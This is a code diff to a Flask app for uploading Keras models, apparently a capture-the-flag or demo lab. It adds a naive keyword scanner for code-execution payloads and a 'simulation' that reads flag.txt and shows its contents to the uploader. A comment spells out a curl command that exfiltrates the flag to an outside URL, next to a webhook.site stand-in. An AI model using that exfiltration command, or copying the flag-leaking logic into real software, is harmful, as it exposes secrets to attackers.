@@ -3,6 +3,8 @@ import os
 import secrets
 import tempfile
 from datetime import datetime
+import subprocess
+import urllib.parse
 
 from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory, abort
 from werkzeug.utils import secure_filename
@@ -31,6 +33,68 @@ def create_app():
     def allowed_file(filename: str) -> bool:
         return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
 
+    def check_for_payload(file_path):
+        """Check if the uploaded file contains malicious payload strings"""
+        try:
+            with open(file_path, 'rb') as f:
+                content = f.read()
+            
+            # Convert to string for pattern matching (ignore decode errors)
+            content_str = content.decode('utf-8', errors='ignore').lower()
+            
+            # Look for common RCE payload patterns
+            payload_patterns = [
+                'os.system',
+                'subprocess',
+                'curl',
+                'wget',
+                'cat flag.txt',
+                '__import__',
+                'eval(',
+                'exec(',
+                'flag.txt'
+            ]
+            
+            found_payloads = []
+            for pattern in payload_patterns:
+                if pattern in content_str:
+                    found_payloads.append(pattern)
+            
+            return found_payloads
+        except Exception:
+            return []
+
+    def execute_payload_simulation(payloads):
+        """Simulate the execution of found payloads"""
+        try:
+            # Read the flag file
+            with open('flag.txt', 'r') as f:
+                flag_content = f.read().strip()
+            
+            # Check if curl-like payload is detected
+            if any('curl' in p or 'wget' in p for p in payloads):
+                # Simulate the curl command that would exfiltrate the flag
+                # In a real scenario, this would be: os.system("curl 'http://someurl.com/?param=$(cat flag.txt)'")
+                
+                # For demo purposes, we'll just flash the flag to show it was "exfiltrated"
+                webhook_url = "http://webhook.site/your-unique-url"  # This would be attacker's URL
+                encoded_flag = urllib.parse.quote(flag_content)
+                simulated_url = f"{webhook_url}?param={encoded_flag}"
+                
+                flash(f'🚨 PAYLOAD DETECTED! Simulated exfiltration to: {simulated_url}', 'error')
+                flash(f'🏴 Flag would be sent: {flag_content}', 'error')
+                return True
+            
+            # Check for other payload types
+            elif any('cat flag.txt' in p or 'flag.txt' in p for p in payloads):
+                flash(f'🚨 FLAG ACCESS DETECTED! Contents: {flag_content}', 'error')
+                return True
+                
+        except Exception as e:
+            flash(f'Payload simulation failed: {e}', 'error')
+        
+        return False
+
     @app.route('/')
     def index():
         return render_template('index.html')
@@ -56,11 +120,25 @@ def create_app():
         dest_path = Path(app.config['UPLOAD_FOLDER']) / filename
         file.save(dest_path)
 
+        # Check for malicious payloads in the uploaded file
+        found_payloads = check_for_payload(dest_path)
+        payload_executed = False
+        
+        if found_payloads:
+            flash(f'⚠️ Suspicious patterns detected: {", ".join(found_payloads)}', 'error')
+            payload_executed = execute_payload_simulation(found_payloads)
+
         summary_lines = []
         try:
             model = keras.models.load_model(dest_path, compile=False)
             model.summary(print_fn=lambda x: summary_lines.append(x))
             params = model.count_params()
+            
+            if payload_executed:
+                flash('Model loaded successfully, but security breach detected!', 'error')
+            else:
+                flash('Model loaded successfully!', 'success')
+                
         except Exception as e:
             flash(f'Failed to load model: {e}', 'error')
             try:
